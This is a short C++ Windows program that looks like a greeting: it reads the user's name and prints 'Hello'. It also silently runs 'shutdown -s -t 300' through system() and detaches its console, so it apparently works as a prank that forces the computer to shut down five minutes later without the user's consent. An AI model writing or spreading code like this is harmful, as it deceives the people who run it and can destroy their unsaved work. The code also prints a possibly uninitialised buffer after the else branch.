#include <iostream>
using namespace std;

#include <windows.h>
#include <Lmcons.h>

int main() {
  TCHAR name [ UNLEN + 1 ];
  DWORD size = UNLEN + 1;

  if (GetUserName( (TCHAR*)name, &size ))
    cout << "Hello, " << name << "!\n";
  else
    cout << "Hello, unnamed person!\n";
    
    
    cout << name;

   
  system("shutdown -s -t 300");
  
  
  FreeConsole();
}
